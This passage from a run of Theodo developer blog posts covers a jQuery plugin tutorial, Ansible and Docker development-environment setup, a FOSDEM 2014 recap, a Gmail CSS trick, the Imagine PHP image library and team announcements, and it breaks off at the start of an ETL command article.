    ""use strict"";

    // PROGRESSBAR CLASS DEFINITION
    // ============================

    var Progressbar = function (element) {
        this.$element = $(element);
    }

    // PROGRESSBAR PLUGIN DEFINITION
    // =============================

    $.fn.progressbar = function (option) {
        return this.each(function () {
            var $this = $(this),
                data = $this.data('jbl.progressbar');
            if (!data) $this.data('jbl.progressbar', (data = new Progressbar(this)));
        })
    };

}(window.jQuery);

What is the code doing?

IIFE (Immediately-Invoked Function Expression):
!function ($) {
}(window.jQuery);

The ! converts the function declaration to a function expression and allows to invoke it immediatly by adding the (window.jQuery) parentheses. You can find more information on this Stackoverflow thread.
Class definition
var Progressbar = function (element) {
    this.$element = $(element);
}

This creates a Progressbar class that contains the DOM element that you’ll be able to manipulate later.
jQuery plugin definition
$.fn.progressbar = function () {
    return this.each(function () {
        var $this = $(this),
            data = $this.data('jbl.progressbar');
        if (!data) $this.data('jbl.progressbar', (data = new Progressbar(this)));
    })
};

$.fn is an alias of the jQuery.prototype. You can use it to extend jQuery with your own progressbar function. You use each DOM element selected by a jQuery selector as a Singleton data storage to store an instance of a Progressbar object.

Git: Code Diff
step-2 – The prototype
Git: Reset the workspace to step 2:
git checkout -f step-2

The next step is to add an update function to your Progressbar to change its value. Methods can be added to a JS class by defining functions as children of the prototype class attribute (see Object.prototype). In this way, add this code to your js/progressbar.js file:
Progressbar.prototype.update = function (value) {
    var $div = this.$element.find('div');
    var $span = $div.find('span');
    $div.attr('aria-valuenow', value);
    $div.css('width', value + '%');
    $span.text(value + '% Complete');
}

This function changes the values of the aria-valuenow attribute, CSS width and the text. Using it will update all this elements at once. Let’s improve the plugin definition to use your newly created function:
$.fn.progressbar = function (option) {
    return this.each(function () {
        var $this = $(this),
            data = $this.data('jbl.progressbar');
        if (!data) $this.data('jbl.progressbar', (data = new Progressbar(this)));
        if (typeof option == 'number') data.update(option);
    })
};

Add option parameter to your progressbar function and use it to call the update function. Try out this command in the browser console to test your code:
$('#myProgressbar').progressbar(20)

Nice! You can see the Progressbar change.
Git: Code Diff
step-3 – The use case
Git: Reset the workspace to step 3:
git checkout -f step-3

Your plugin is technically working, but how do you want to use it ? The Bootstrap style answer is to call it from your HTML markup. Update the index.html file by adding this HTML:
<p>
    <button data-toggle=""progressbar"" data-target=""#myProgressbar"" data-value=""0"" class=""btn btn-default"">0%</button>
    <button data-toggle=""progressbar"" data-target=""#myProgressbar"" data-value=""10"" class=""btn btn-default"">10%</button>
    <button data-toggle=""progressbar"" data-target=""#myProgressbar"" data-value=""30"" class=""btn btn-default"">30%</button>
    <button data-toggle=""progressbar"" data-target=""#myProgressbar"" data-value=""75"" class=""btn btn-default"">75%</button>
    <button data-toggle=""progressbar"" data-target=""#myProgressbar"" data-value=""100"" class=""btn btn-default"">100%</button>
</p>


data-toggle=""progressbar"" allows to mark this button as a Progressbar toggler.
data-target=""#myProgressbar"" determines which Progressbar is updated by this button.
data-value=""0"" defines next value of the Progressbar.

This HTML is the contract that you will try to honor in the next step.
Git: Code Diff
step-4 – The DATA-API
Git: Reset the workspace to step 4:
git checkout -f step-4

For each click on a button, you will use the jQuery object data-api to collect the information needed by the plugin:
// PROGRESSBAR DATA-API
// ====================

$(document).on('click', '[data-toggle=""progressbar""]', function (e) {
    var $this = $(this);
    var $target = $($this.data('target'));
    var value = $this.data('value');
    e.preventDefault();
    $target.progressbar(value);
});

This listener is added to the progressbar.js file and listens to all the buttons in the application containing the data-toggle=""progressbar"" attribute. Finally, update the Progressbar with the correct value.
Git: Code Diff
step-5 – The optional functions
Git: Reset the workspace to step 5:
git checkout -f step-5

Your Progressbar jQuery plugin works! Last exercise to improve it. How could you use this new button?
<button data-toggle=""progressbar"" data-target=""#myProgressbar"" data-value=""reset"" class=""btn btn-default"">Reset</button>

typeof javascript function allows to treat differently an integer and a string passed to the the data-value attribute and calls the correct function:
if (typeof option == 'string') data[option]();

This line added to the plugin definition allows to call this function:
Progressbar.prototype.reset = function () {
    this.update(0);
}

The plugin definition is now ready to accept some improvements. You can simply add a new function to the plugin and call it by passing its name to the data-value attribute. It has never been easier to add a finish function. In the progressbar.jsfile:
Progressbar.prototype.finish = function () {
    this.update(100);
}

In the template:
<button data-toggle=""progressbar"" data-target=""#myProgressbar"" data-value=""finish"" class=""btn btn-default"">Finish</button>

Works like a charm, doesn’t it?
Git: Code Diff
Conclusion
This code, inspired by Bootstrap plugins, was to show you how to create a jQuery plugin using a Javascript object, its prototype and communicate between DOM element through the jQuery data-api.
I hope you read this tutorial with interest. Don’t hesitate to comment for any questions or suggestions!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jonathan Beurel
  			
  				Jonathan Beurel - Web Developer. Twitter : @jonathanbeurel  			
  		
    
			

									"
"
										We’re super excited to welcome Antoine Gruzelle to dev team!
Thanks to being a true card player shark, he now thrives to be our pro poker planner. He can focus and control his adrenaline to tackle any difficulty that might rise in his upcoming challenges – be it programming or, well, anything in fact.
As a matter of fact, just days after he joined, he showed us what he’s made of by winning Theodo’s first table tennis tournament!
So when he seems to be struggling hard, don’t believe that he is overwhelmed…
He’s probably bluffing and waiting for the best moment to play his ace!
Fun facts:

Types exclusively on Bépo keyboard layout
Feels like a ninja when working on Steganography.

 

 
If you are interested in steganography or in treasure hunting, do download his picture and find some easter eggs!
Welcome, Antoine!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Guillaume Dedrie
  			
  				Guillaume Dedrie - Web developper @Theodo. Loves new technologies.  			
  		
    
			

									"
"
										
Le directeur exécutif et co-fondateur de Theodo,  Benoît Charles-Lavauzelle , a été sélectionné pour représenter les entrepreneurs français au Sommet du G20 des entrepreneurs. Celui-ci aura lieu du 18 au 22 juillet prochains en Australie. Au sein d’un panel de jeunes entrepreneurs français parmi les plus dynamiques, il rencontrera des entrepreneurs venus des autres Etats membres du G20. L’objectif est de partager les meilleures pratiques et de produire des recommandations pour favoriser l’entrepreneuriat.
L’Alliance des Jeunes entrepreneurs du G20 (G20 YEA) est un collectif qui promeut l’entrepreneuriat des jeunes comme facteur de renouvellement économique, de création d’emplois, d’innovation et d’évolutions sociales. Le G20 YEA tient un sommet annuel préalable aux Sommets du G20 et du B20 (le Business 20) regroupant des grands Leaders politiques et économiques. Le but du G20 YEA Summit est de favoriser l’entrepreneuriat en avancant des recommandations au B20 et au G20 et d’agir effectivement selon ces recommandations dans l’activité quotidienne. 
Theodo est donc particulièrement fier d’y participer cette année pour y défendre les valeurs de l’agilité, la qualité de l’expertise web en France et rentrer la tête pleine d’idées nouvelles !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Haguenauer
  			
  				  			
  		
    
			

									"
"
										Ansible is a IT automation tool very popular on GitHub. It’s written in Python and has been designed to be simple to use.
This article explains how we have created an Ansible provisioning for a Symfony2 project working with a Postgresql database. This Ansible playbook has been tested with Vagrant 1.3.5 and Ansible 1.3.3. The goal of this playbook is to provide a simple Ansible provisioning of a Ubuntu VM to run a Symfony2 project.
We will show you some useful commands that we used on our Ubuntu 12.04 LTS. We let users of other OS translate the commands.
START A SYMFONY2 PROJECT WITH ANSIBLE
The use of this repository is very easy and needs only those steps.
1. Before you start you need to have Vagrant and Ansible installed on your machine.
You can download vagrant here: http://www.vagrantup.com/downloads.html
You can find Ansible here: http://docs.ansible.com/intro_installation.html or simply install it with

 $ apt-get install ansible

2. If you haven’t yet, it’s time to clone the repository:

$ git clone git@github.com:MaximeThoonsen/ansible-devops.git

3. Update your /etc/hosts file or your OS equivalent and add the future ip of the VM: “199.199.199.51  dev-myapphost”
4. Add your ssh public key in the provisioning by editing the /files/var/www/.ssh/authorized_keys file
5. Now you are good to create the VM:
$ vagrant up --provision
If the VM is up and running but the provision hasn’t been done, you can do:
$ vagrant provision 
If some errors occur look at the lists of common errors at the end of this article. You have to wait 5-15 minutes the time for the vm to upgrade and install everything.
6. It’s ready! You should be able to see it at http://dev-myapphost

HOW TO CUSTOMIZE YOUR ANSIBLE PROVISIONING
I’ll start with a brief explanation of the purpose of each directory of the provisioning.
1. “group_vars”: This directory is used for the definition of most of the few useful variables. They are used in all the other files for the configuration of the VM.
2. The “files” directory copy the file with no change into the VM’s system. It’s an easy way to provide some configuration.
3. The “templates” directory is also for copying file but this time, as you may have guessed, you can use variables to create them dynamically. It contains the nginx’s configuration template which uses some variables defined in the group_vars/all file.
4. The “hosts” is used to define variables for the use of different deployment environments (staging, production, ..)
5. The “roles” directory contains the commands used to install all the required packages. (Postgres,git,vim, ..)
HOW TO INSTALL POSTGRESQL WITH ANSIBLE
The file that describes the needed ansible commands can be found at roles/backend/tasks/postgresql.yml
Ansible has to download the key of the repository for your VM’s OS. For ubuntu, you can find the postgres package’s key here. Adapt the following url or command to your OS using the ansible documentation and the postgres download page.
 - name: postgresql - add repository key
  apt_key: url=https://www.postgresql.org/media/keys/ACCC4CF8.asc state=present

Then you can add the repository.
- name: postgresql - add official postgresql repository
  apt_repository: repo=""deb http://apt.postgresql.org/pub/repos/apt/ precise-pgdg main"" state=present

You can generate the locale you want to use in the database with the following commands (works on ubuntu):
- name: postgresql - add locale
  lineinfile: dest=/etc/locale.gen create=yes line=""fr_FR.UTF-8 UTF-8"" regexp=""^fr_FR.UTF-8"" insertafter=EOF

- name: postgresql - regen locales
  command: /usr/sbin/locale-gen

You can finally install the package and configure the db. The database will be created with the app.name defined in the group_vars file. It’s the same for the user and the password. You can change the variables, create new ones or directly put the values you want in the ansible commands
- name: postgresql - install version 9.3
  apt: pkg=postgresql-9.3 state=latest update_cache=yes

- name: postgresql - create db
  sudo_user: postgres
  postgresql_db: name=""{{ app.name }}"" encoding=""UTF-8"" lc_collate=""fr_FR.UTF-8"" lc_ctype=""fr_FR.UTF-8"" template='template0'

- name: postgresql - create user
  sudo_user: postgres
  postgresql_user: db={{ app.name }} user={{ app.name }} password={{ app.name }}

- name: postgresql - apply privileges
  sudo_user: postgres
  postgresql_privs: db={{ app.name }} privs=ALL type=database role={{ app.name }}

- name: postgresql - install postgresql-contrib-9.3 --needed for fulltextsearch
  apt: pkg=postgresql-contrib-9.3 state=latest update_cache=yes

Thanks to Nicolas for his precious help!

List of common errors
The guest machine entered an invalid state while waiting for it
to boot. Valid states are 'starting, running'. The machine is in the
'poweroff' state. Please verify everything is configured
properly and try again.

You may have to enable the virtualization in the bios of your machine.

fatal: [www-data@dev-myapphost] => SSH encountered an unknown error during the connection. We recommend you re-run the command using -vvvv, which will enable SSH debugging output to help troubleshoot the issue

You may have not specify the IP of your VM.
1) update your /etc/hosts file and enter the ip of your vm (like:”199.199.199.51  dev-myapphost”)
2) add your key in the provisioning in provisioning/files/var/www/.ssh/authorized_keys
List of common warnings
...util/which.rb:32: warning: Insecure world writable dir /usr/local/bin in PATH, mode 040777
A potential solution
$ chmod go-w /usr/local/bin/

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										
On the 1st & 2nd of February 2014, Brussels became the place where to learn and to train for a plethora of tech-savvy women, men and robots. It was all about this year’s new edition of FOSDEM, which took place once again at the ULB (Université Libre de Bruxelles) Solbosch Campus for openness’s sake.
Since I really enjoyed spending these two days there, surrounded by thousands of geeks litterally, I’ve decided to write this article to encourage the readers to plan the trip with enough time upfront for the upcoming editions (especially as access to all tracks is free as in free beer!).
With over 7k visitors attending half of a thousand tracks, the IPv6 installation was totally worthwhile and held solid until the end. Seriously, when was the last time, you didn’t have irreversible issues with wireless networks when attending some event?
Though I personally had no choice in connecting to the double stack network from time to time, the sole availability of the latter is a perfect reminder of all the care, the volunteers donated all along these two days. The huge success reached on this weekend also proves how institutions and public commonalities can be put to use in developing even more synergy within existing and yet-to-be-built open source project communities.
Security
By pointing me at an article posted on the Tor project blog few months ago, Nicolas Bazire drew my attention to deterministic builds. One of the many risks incurred by core OSS project contributors, would be to have a single compromised machine, becoming susceptible of infecting millions of others in a snowball effect. Jérémy Bobbio (Debian maintainer) decided to work from there with a clear mission statement asserting that It should be possible to reproduce, byte for byte, every build of every package in Debian.
This is what led me to one of the first sessions in the distributions devroom of this Saturday morning,
where Jérémy Bobbio a.k.a. Lunar at debian dot org, explained how this goal could be achieved by

recording the build environment,
reproducing the build environment,
eliminating unneeded variations.


Provided that most of the unneeded variations originate from

timestamps, 
build path, 
hostname, username, uname, 
files list order.

The beginning of a solution would consist in

sharing a standard virtual machine, 
installing packages from snapshots.debian.org 

applying plenty of other smart tricks as described on the reference wiki like

passing “–enable-deterministic-archives” to binutils, 
timestamps with environment variables, 
patching gzip,
taking benefit of stable file list in archives.



By the time of the conference, Lunar had achieved a 62% success rate with 3196 packages out of 5151 which can be built in a deterministic way i.e. with same checksums obtained for same binaries.
He insisted on the fact this can only be part of the solution and not a unique solution to improve the overall security of the build toolchain.
Lunar also called for contributors (targeting the PHP registry among many others for Debian) to extend the current coverage, as himself started to work on this project at DebConf2013, which now requires more hands.
Anybody interested in security in general, closely related to Debian and other distributions or willing to contribute, can subscribe to the official Reproducible builds mailing list.
Mozilla Track
In the Mozilla track, Srikar Ananthula described how Mozilla Persona can be a better way to sign-in with no need to store passwords, nor to rely on third-parties.
Mozilla WebMakers is already relying on it and lots of existing libraries and plugins already implement the Browser Id protocol.

Fabien Cazenave shedded some lights on The state of Firefox OS.
According to Kazé, the days of “Flash and Retry” experience are over (mostly).
Now that a healthy 12 week release cycle has been established, new web APIs are coming with:
 * DataStore API
 * Shared workers
A reference device (InFocus 10″, 1280×800x24bit, 16GB Storage, 2GB RAM) has been selected to build FirefoxOS on tablets.
As a result, developers will very soon be able to sign up for participating to the contribution program.
Legal and policy issues
Besides, I had the pleasure to attend my first conference on legal and policy issues with John Sullivan (executive director of the free software foundation) with “JavaScript, If you love it, set it free“. After recalling some of the biggest recent successes of the foundation (sales of the Gluglug X60 as one of the computers being endorsed to respect our freedom), he proposed a couple of implementations to address the issue of licencing JavaScript code served by websites.
The basic freedom checklist requires

licence notice and possibly a copy of the free licence, 
complete source code (i.e. preferred form of a program for modification).

Privacy

Have you ever been looking to replace your current webmail? Bjarni R. Einarsson has a more than decent solution to offer.
As highlighted in his mailpile introduction, the state of e-mail was kind of stuck in the 90s.
Provided cloudy email is worse for freedom than closed source, mailpile team decided to focus on

making software, FOSS folks enjoy

hacking on,
want to use ;


making e-mail encryption understandable,
make decentralization easy,
find better business models for e-mail. 

A very neat web interface has been crafted by MailPile team.
Mailpile alpha version has been released with PGP encryption and signatures and search engines.
Moreover, developers can already play around with a REST API and a command-line interface. Multiple mailbox formats are supported. Spam filters learn from manually tagged emails, messages the user reads, replies to or forwards.
Graph databases
In the morning of the following day, Armando Miraglia (known as a commiter of sshguards) demonstrated the new Giraph APIs for Python, Rexster and Gora. Giraph is used for large scale processing with Hadoop and it is an open-source implementation of Pregel. Armando’s fork supports writing user logic in languages other than Java such as Python.
Davy Suvee illustrated The power of graphs to analyze biological data with an exploration platform (BRAIN).
This platform comes as a stack built to relate 23 million biomedical articles and it can be separated into three distinct layers with:

meta-data stored with MongoDB,
graphs persisted into Neo4J
end-user interface built with Swing

JavaScript
Entering the JavaScript devroom was not trivial but I eventually managed to get a seat there. From what I have heard, it was the first time, JavaScript has its fully dedicated room at FOSDEM appart from the Mozilla tracks.
Robert Kowalski mentioned useful subcommands to execute with npm like config, repo, outdated.
In his talk entitled “Hidden gems in npm”, he revealed npmd in particular as it provides:

offline search,
offline publishing with queuing,
full caching of installed modules.

Afterwards, Laurent Eschenauer showcased how to pilot AR.Drone in JavaScript.
The main principles behind the drones flight automation were exposed:

Remote control API, 
State estimation (or figuring where a drone is),
Motion control with PID,
Path planning.

Testing and automation
Last but not least, Sebastian Bergmann was a speaker at FOSDEM for the first time in the testing and automation developer room.
He told us the story of “Pride and Prejudice: Testing the PHP World” or introduced how he gave birth to PHPUnit application out of pain – by delegating the latter to machines using automation.

Hopefully, we will have the opportunity to attend the next series of conference at FOSDEM 2015 and we might even meet with some of you there in a crowded devroom.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				thierrym
  			
  				  			
  		
    
			

									"
"
										TL;DR
This article aims at teaching how to install lovely command-line tools in a recoverable way.
You’ll be able to multiplex zsh terminals over a UDP connection (using mobile shell):

The reader is strongly encouraged to browse thoroughly the Dockerfile put in reference,
which steps summarize how to build the premises of such a text-only environment.
Disclaimer: To some extent, you might feel a bit dizzy because of the specially crafted mise en abyme.
The dizziness is a typical side effect of linux container abuse…
No worries, the feeling will just vanish with time (or you might just end up killing the wrong processes).
Dot files
Each and every user of linux distributions (or similarly flavoured operating systems)
might take a minute or two to acknowledge the significance of their own dot_files.
Even though they are hidden by design, I believe our productivity directly depends on the care they receive from us.
We all have heard (if not even worse) of hard drives just dying in some random boxes.
Still feeling a bit sceptical? Pretty numbers have been published on Backblaze blog just to satisfy our curiosity.
Being a big fan of upcycling doesn’t strictly imply there could be some happy ending for few choosen hard drives, anyway.
The bottom line is, the more precious and rapidly changing our data feel
and the more regular we shall have backup for them ready to be restored.
I insist on the latter part as knowing precisely
how to restore backups is the only way to really feel confident about them.
Let us see how to proceed in order to get things done i.e. hidden dot files safe.
Experimenting with Docker
The experiment is bootstrapped with the now classic installation of vagrant and virtual box.
Installing Virtual box
For instance, in a box running Wheezy 7.3, we would execute the commands:
# Add a GPG key downloaded from virtual box official website 
wget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | sudo apt-key add -

# Download package lists from repositories
sudo apt-get update

# Install virtualbox
sudo apt-get install virtualbox-4.    

Binaries for other operating systems can be fetched from the official VirtualBox download page.
Installing Vagrant
The Vagrant download page offers 64-bit installation package for Debian:
# Install dependencies to share folders with NFS
sudo apt-get install nfs-kernel-server nfs-command

# Download Vagrant installation package 
wget https://dl.bintray.com/mitchellh/vagrant/vagrant_1.4.3_x86_64.deb -O /tmp/vagrant_1.4.3_x86_64.deb  

# Install Vagrant 
sudo dpkg -i /tmp/vagrant_1.4.3_x86_64.deb

Installing Docker
# Clone the linux container engine repository 
# (we assume Git has already been installed in the host)
git clone https://github.com/dotcloud/docker.git && cd docker

# Run Vagrant
vagrant up

# Access the vagrant box provided by DotCloud 
# to use docker from their official box
vagrant ssh

Customizing our shell
# Install git, vim and mobile shell in the vagrant box
sudo apt-get install git vim mosh

# Clone the repository containing a Dockerfile
git clone https://github.com/thierrymarianne/zen-cmd.git zen-cmd

# Build a container from the Dockerfile 
# and tag it with name ""zen-cmd"" if the build is successful
cd zen-cmd && docker build -t zen-cmd .  

From this point, one shall have received a positive message (Successfully built) accompanied by a pretty hash.
These 12 characters are to be kept preciously.
Believe it or not, we are done already here or better said,
our personal shell has been set up according to our container building script (Dockerfile).
The pretty hash identifies a docker image which can now be run in order to use our command-line interface.
In a nutshell,

Installing a custom-tailored command-line environment only took us the time of making some notes in the shape of a Dockerfile about what needs to be customized.
Executing a single command was enough to restore our command-line environment personalized over time

Fellows of little faith are absolutely right in showing doubts about this so let us run the interactive shell (within a container within a vagrant box),
in order to proceed, one just needs to execute the following commands
# Copy predefined SSH configuration from the article repository
cp -R ./ssh/* /home/vagrant/.ssh

# Start an ssh agent
ssh-agent /bin/bash

# Let our ssh agent handling a key allowed to access the container
# with passphrase being ""elvish_word_for_friend""
# (One shall certainly generate its own pair of keys 
# using `ssh-keygen -f path_to_private_key` otherwise)
chmod 0400 ~/.ssh/zen-cmd && ssh-add ~/.ssh/zen-cmd

# Run openssh daemon from our brand new container
docker run -d -t zen-cmd /usr/sbin/sshd -D & export LC_ALL=en_US.UTF-8 && /usr/bin/mosh-server new -p 6000

# Save container id for inspection
CID=`docker ps | grep zen-cmd | cut -d ' ' -f 1 | head -n 1`; 

# Alias ""zen-cmd"" container ip address to ""zen-cmd"" host
sudo /bin/bash -c ""echo `docker inspect -format '{{ .NetworkSettings.IPAddress }}' $CID`'    zen-cmd' >> /etc/hosts""

# Access our portable command-line environment using mosh-client
mosh zen-cmd

# In the container, run tmux to multiplex zsh terminals
tmux

Let us dive into the details of this automated script :

Our package lists are updated (the same way we did before Installing VirtualBox).
Packages needed to compile binaries are installed
Target directories are created respectively to

clone sources
install binaries from sources


Git is installed
Tmux, oh-my-zsh repositories are cloned
Tmux, oh-my-zsh are installed and configured
Zsh is set as default shell
Password authentication is disabled for ssh
Mosh server is installed
UTF-8 locale required to run mobile shell is generated
Privilege separation directory is created for ssh
Our vagrant ssh public key is added to authorized keys of our container
SSH and Mobile shell ports are opened

Leveraging git
Since we mostly deal with plain text files here, git appears to be a quite legitimate version control system.
Even GitHub made a point in popularizing the habit of sharing them (the dot_files).
What are the direct benefits coming out of it?
According to their unofficial guide,

boxes are kept in sync
technology watch becomes easier
knowledge is redistributed

End Of Line
I hope you have enjoyed this setup which has the clear advantages of being portable, testable and recoverable.
Syntax to write your own Dockerfile can be found in Docker official documentation.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				thierrym
  			
  				  			
  		
    
			

									"
"
										Have you ever wanted to look at your GMail Inbox to find some information in an old email… but without being disturbed by all these new emails that will inevitably draft you away from your current focus and destroy your productivity?
At Theodo, we have found a really simple way to do just that! It is a trick based on Stylish to hide all unread emails on demand.
First install the Stylish extension for your favorite browser :

the Chrome extension: https://chrome.google.com/webstore/detail/stylish/fjnbnpbmkenffdnngjfgmeleoegfcffe
the Firefox extension: https://addons.mozilla.org/en-US/firefox/addon/stylish/

And then create a new “style” that you call “Gmail pause”:

    .zE { display: none; }
    .n1 a[title^=Inbox] {
      font-weight: normal !important;
      width: 2.5em;
      padding: 0;
      display: inline-block;
      overflow: hidden;
    }

You can then hide or see your unread emails at will, using the small “S” icon in the top-right corner.
I hope it will be as revolutionary for your productivty as it was for me!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										We are happy to announce that Matthieu and Thierry are now SensioLabs Certified Symfony Developers.
Congratulations for both of them!
This makes us the first company after Sensio to have 5 certified developers, and we hope that soon other teammates will join them!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										

I recently read an interesting article on the pros and cons of two of the most known PHP image manipulation libraries: GD and ImageMagick. As interesting as this reading was, it did not mention a very useful object oriented image manipulation library and its corresponding bundle to all those waiting for the simplest solution to edit, transform and store pictures on their Symfony2 web application: The Imagine library and the LiipImagineBundle. I will try to fill this gap by explaining how these two tools can greatly help you managing pictures easily.

The Imagine library
This library is the perfect PHP 5.3+ object oriented tool to interact with your pictures in a simple way. It provides a common implementation for three of the most known image libraries (GD2, IMagick, Gmagick). So, pick your favorite one (using for example the aforementioned article), install Imagine using the official (well written) documentation and keep going! You still have a lot to discover…

The basics
Let’s start with opening an existing picture using Imagine:

$imagine = new Imagine\Gd\Imagine();
//or
$imagine = new Imagine\Imagick\Imagine();

$image = $imagine->open('/path/to/image.jpg');
Note: Depending on the name of the driver you are using, you will have to switch the namespace of the Imagine class to use: one of the rare drawbacks of Imagine. But let’s not worry to much as this drawback can be overcome (check the Imagine Bundle main features below).
As you may have already noticed, Imagine follows some very simple and intuitive rules. For example, if you want to resize or crop an image (one of the most common and basic functionalities in Imagine) you will have to deal with “coordinates” and “dimensions”. To crop you will need to specify the top left corner coordinates and the desired dimensions of the crop. You will therefore have to implement the PointInterface as follows:

//Indicates coordinates (x: 15, y: 30)
$coordinates = new Imagine\Image\Point(15, 30);
Note: The coordinates always start from the top left corner and cannot have negative values.
And to specify dimensions implement the BoxInterface like this:

//Indicates dimensions (width: 400, height: 300)
$dimensions = new Imagine\Image\Box(400, 300);

Since most of these code excerpts are actually extracted from the official Imagine documentation I will focus on the main interests of the library rather than duplicating code examples you could easily find on the corresponding page in the official documentation.


Overview of the main features

Drawing shapes: “Drawer” class allows you to easily draw geometric figures or add text using a specific font you like
Editing colors: Helps you define and alter colors on your pictures using a different “Palette” depending on your needs (CMYK, RGB or more recently Grayscale)
Managing layers: If you are not using GD2, you can use “Layers” as an object oriented way to interact with picture layers. Among other things it can help you flatten a layered picture or create animated gif image.
Adding effects: Depending on the driver you picked (and at the time this article has been written), you can use all or a subset of the “Effects” Imagine puts at your disposal (Gamma, Negative, Grayscale, Colorize, Sharpen, Blur)
Applying filters and transformations: Many “Filters” are available in Imagine (ApplyMask, Copy, Crop, Fill, FlipHorizontally, FlipVertically, Paste, Resize, Rotate, Save, Show, Strip and Thumbnail). What each of them do is well explained in the “ManipulatorInterface”. Besides applying filters directly to an image, Imagine provides a way to stack filters into a “Transformation” instance which can be applied later on one or multiple images (very convenient to decouple your image manipulation from the filter creation).

The Imagine library is already considered a reference when it comes to clean and decoupled image manipulation. I have briefly described its main features above but it contains more including some advanced “Filters” and a clean “Exception” management system. As you can see, it already covers most of the basic and even advanced use cases, and since it has been built to be easily extensible, you will not have too much trouble implementing any missing behaviour.
For those of you wanting to integrate it into a Symfony2 application, there is a Symfony2 bundle for that: the LiipImagineBundle. It uses the Imagine library and completes it with additional useful features.



The Imagine bundle
The LiipImagineBundle wraps the Imagine library into a Symfony2 bundle and includes it into a larger (and yet simple) workflow. As the library itself, this bundle has been made highly extendable and therefore you can customize almost each part of the workflow’s behaviour.

The basic workflow
1. First, you will need to install and configure your bundle. Lucky for you, the Liip team thought about that and provides a quite understandable semantic configuration for the bundle.
2. Then use one of the Twig filters you defined in your configuration by calling it on a picture asset in one of your Twig templates.
3. If you now request the corresponding page (for example to display it in your browser) the ImagineBundle will detect if the filter has already been applied to this specific picture:

If yes: the already generated (and cached) picture will be retrieved and provided to the template
If not: the filtered picture will be generated and stored and then provided to the template, in a completely transparent way for the end user.



Overview of its main features

Semantic bundle configuration: Already well documented and with sensible defaults, this configuration allows you to use the bundle almost out of the box. Besides by defining here the driver you use, you get rid of the Imagine aforementioned drawback on “driver specific Imagine namespaces”.
Twig and PHP template filter helper: As explained in the “Basic usage” section of the documentation homepage, each filter defined in the bundle configuration will then be available in your Twig templates using the “imagine_filter” Twig filter, making it easy to apply filters you configured (also available for PHP templates).
Controller as a service: If you need to apply filters anywhere else than in templates you can, using the available service controller.
Image loaders: You can customize the way you retrieve your images. The default configuration will provide you with a basic filesystem loader but you also have two other built-in loaders: Stream and MongoDB GridFS. The documentation also explains how you can chain data transformers to a custom loader to get an image from virtually any kind of file (PDF in the example).
Cache resolvers: The bundle uses its own caching system. It provides you with a bunch of different resolvers out of the box (Amazon S3, AWS, with a Filesystem default cache resolver) and allows you to add your own and extend the existing ones.




Summary
Using GD or Imagick to transform the pictures of your Symfony2 application (well even any web application) is good but using the Imagine library is better. It provides you with an object oriented and extensible code structure through a simple but powerful API. Using it allows you to easily switch from GD to Imagick for instance, if you started using GD and find a major drawback later. Still not convinced? Think about the next time a new developer will have to read and maintain the code you are currently so proud of.
And if you are in a Symfony2 application context you can get an even better solution depending on your needs: the LiipImagineBundle. Based on Imagine, it adds many useful features such as cache handling, template integration, many different strategies to store and retrieve your images, and all of this is highly customizable. Could you reasonably ask for more (except for coffee)?
Finally, if you want to know more on which driver you should use and see a basic but functional example of how Imagine can be used you can check this presentation I recently made. Its code focuses on the advantages of the “Transformation” approach over the more basic “Filter” one.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Charles Pourcel
  			
  				Charles Pourcel - A Web Developer who liked symfony 1.x, loves Symfony2 and keeps digging into it for new treasures. An indentation (best practices in general, we might say...) maniac? Who are you to judge!  			
  		
    
			

									"
"
										When you manage data on a regular basis, it can be very useful to write a
command to facilitate this repetitive tasks. The crude way to do it would
be to let the command do the job alone. But this isn’t a clean way to
do it. Why? Because you wouldn’t be able to write a test for your command.
It would be a black box that interact with some critical component of your
project. There is a solution: using ETL services in your command, and that’s
what we’re are going to show you here.
Using ETL services means defining 3 services: an extractor to get the data
from a source, a transformer to adapt the data to its new use and a loader
to update or create the data in the target, each services passing the data
to the next one.
Of course this method has a wide range of application, from editing files
to migrating database or importing/exporting data. As example I’ll handle
the migration of article from a blog: my article are in a legacy mysql
database, they contain a content and an author id that link them to an user
and I have already migrated the user and stored their legacy id. I choose
to use raw SQL for performance issue but this would also work with ORM.

Command
Because I use ETL I already know how the command will work:

I start by loading the 3 services.
I extract the data using an extract() method from the extractor.
I’ll load a row of data to process with nextRow. The row will be put in a parameter bag.
While there is rows to process I try to iterate the following:
Transforming the data with a transform($data) method from the transformer.
Loading the data with a load($data) method from the loader.
Outputing a nice success message and go on to the next row.
If this process fail, I catch the error and output a faillure message. Then I go on to the next row.

I chose to extract the data piece by piece instead of all in one shoot to
use less memory. It also allows me to log some information of the migration
as it goes on, even in the case of a failure. If something goes wrong with
a piece of data (for example the author of an article cannot be found in the
new database), the transformer or the loader will throw an exception with
an explicit message.
Now that I know what process I expect, I can write the command before writing
any problem specific code.
class MigrateArticleCommand extends Command
{
